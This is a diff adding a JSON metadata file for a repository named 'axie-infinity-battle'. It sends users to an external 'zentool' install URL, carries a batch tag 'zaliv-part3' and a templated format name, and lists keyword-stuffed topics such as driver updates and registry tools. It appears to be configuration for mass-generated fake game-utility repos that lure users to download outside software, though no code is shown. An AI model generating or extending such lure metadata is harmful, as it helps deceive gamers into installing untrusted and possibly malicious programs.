@@ -1,0 +1,26 @@
+{
+  "repo": "axie-infinity-battle",
+  "product": "Axie Infinity Battle",
+  "kind": "utility",
+  "install_type": "zentool",
+  "install_url": "https://zentool.art/",
+  "batch": "zaliv-part3",
+  "format": "license-md-zentool-v1-no-banner",
+  "category": "gaming-companion",
+  "topics": [
+    "axie-infinity-battle",
+    "axie-desktop",
+    "axie-windows",
+    "system-optimization",
+    "driver-update",
+    "pc-maintenance",
+    "disk-cleanup",
+    "registry-tools",
+    "desktop-utility",
+    "windows-tools",
+    "performance-tuning",
+    "hardware-monitor",
+    "admin-toolkit"
+  ],
+  "site": "zentool.art"
+}
